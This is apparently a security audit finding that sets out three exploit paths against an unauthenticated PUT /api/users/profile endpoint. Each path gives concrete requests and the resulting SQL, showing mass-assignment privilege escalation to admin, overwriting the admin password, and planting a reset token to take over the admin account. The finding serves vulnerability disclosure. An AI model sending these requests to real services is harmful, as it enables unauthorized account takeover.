findings.exploit_path:
1. Attacker sends PUT /api/users/profile with {"username": "alice", "role": "admin"}
2. Server destructures: username='alice', fields={role: 'admin'}
3. Object.entries(fields).map() produces: "role = 'admin'"
4. SQL executed: UPDATE users SET role = 'admin' WHERE username = 'alice'
5. alice is now an admin user
6. No authentication check exists on this endpoint

1. Attacker sends PUT /api/users/profile with {"username": "admin", "password": "attacker_pass"}
2. SQL executed: UPDATE users SET password = 'attacker_pass' WHERE username = 'admin'
3. Attacker logs in: POST /api/login {"username": "admin", "password": "attacker_pass"}
4. Full admin session token obtained

1. Attacker sends PUT /api/users/profile with {"username": "admin", "reset_token": "attacker_token"}
2. SQL executed: UPDATE users SET reset_token = 'attacker_token' WHERE username = 'admin'
3. Attacker calls POST /api/reset-confirm with {"token": "attacker_token", "password": "new_password"}
4. Admin password is now 'new_password'

